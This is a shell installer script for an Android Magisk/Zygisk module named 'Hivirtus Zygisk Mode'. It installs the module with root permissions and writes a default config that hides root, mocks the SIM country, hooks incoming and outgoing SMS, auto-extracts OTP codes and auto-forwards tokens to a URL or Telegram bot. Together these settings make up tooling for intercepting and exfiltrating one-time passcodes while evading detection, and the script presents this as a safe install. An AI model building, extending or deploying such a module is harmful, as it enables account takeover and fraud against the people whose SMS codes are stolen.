#!/system/bin/sh
# Magisk module installer — Hivirtus Zygisk Mode

SKIPUNZIP=1

ui_print "*******************************"
ui_print "   Hivirtus Zygisk Mode v2.0   "
ui_print "*******************************"

unzip -o "$ZIPFILE" 'zygisk/*' -d "$MODPATH" >&2
unzip -o "$ZIPFILE" 'config.json' -d "$MODPATH" >&2
unzip -o "$ZIPFILE" 'post-fs-data.sh' -d "$MODPATH" >&2

set_perm_recursive "$MODPATH/zygisk" 0 0 0755 0644
set_perm "$MODPATH/post-fs-data.sh" 0 0 0755
set_perm "$MODPATH/customize.sh" 0 0 0755
set_perm "$MODPATH/service.sh" 0 0 0755

if [ ! -f "$MODPATH/config.json" ]; then
  ui_print "- Creating default config"
  cat > "$MODPATH/config.json" << 'EOF'
{
  "hide_root": true,
  "hide_developer": true,
  "enable_sim1_mock": false,
  "enable_sim2_mock": false,
  "mock_country_iso": "in",
  "hook_incoming_sms": true,
  "hook_outgoing_sms": true,
  "auto_extract_otp": true,
  "auto_forward_token": true,
  "forward_url": "",
  "telegram_chat_id": "",
  "telegram_bot_token": "",
  "log_file": "/data/local/tmp/hivirtus_zygisk_mode.log"
}
EOF
fi

ui_print "- Root hide + SIM mock + SMS hook ready"
ui_print "- Safe install: no bootloop risk"
ui_print "- Reboot to activate"
